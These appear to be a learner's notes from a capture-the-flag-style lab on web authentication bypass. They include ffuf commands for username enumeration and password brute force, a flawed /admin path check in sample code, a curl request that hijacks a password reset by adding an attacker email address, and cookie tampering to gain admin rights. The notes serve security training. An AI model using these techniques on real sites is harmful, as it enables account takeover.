
# Authentication Bypass

different ways website authentication methods can be bypassed, defeated or broken.

helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid username
Website error messages are great resources for collating this information

- user  input in form fields
- fake name returns 'username already exists', which then can be added to our usernames list

## ffuf

`ffuf` tool uses common usernames to check against any matches

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://x.x.x.x/customers/signup -mr "username already exists" 
```

- `touch valid_usernames.txt`

```
steve
simon
robert
```

### BRUTE FORCE 

using `valid_usernames.txt` file generated from above and now we brute force 

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://x.x.x.x/customers/login -fc 200 
```

- W1: steve
- W2: thunder

### LOGIC FLAW 

The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with /admin, the page is shown to the client.

```{PHP}
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```

 The code presents a logic flaw because an unauthenticated user requesting `/admin` will not have their privileges checked

### PASSWORD RESET
If an invalid email is entered, you'll receive the error message "Account not found from supplied email address".

example:
```
robert@acmeitsupport.thm 
username: robert
```

### curl requests

- reset email username submitted wit `POST` 
- email is sent request `GET`

```
curl 'http://x.x.x.x/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert' 
```

- rerun code but add `'username=robert&email=attacker@hacker.com'`

```
username: cupcake
email: hacker@cupcakes.com
password: cupcake5
cupcake@customer.acmeitsupport.thm
```

## COOKIE TAMPERING 

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges

- cookie for log in 
- cookie for admin privileges

- `curl http://x.x.x.x/cookie-test` returns "not logged in"

- `curl -H "Cookie: logged_in=true; admin=false" http://x.x.x.x/cookie-test` => logged in as user 

- rerun code, admin=true

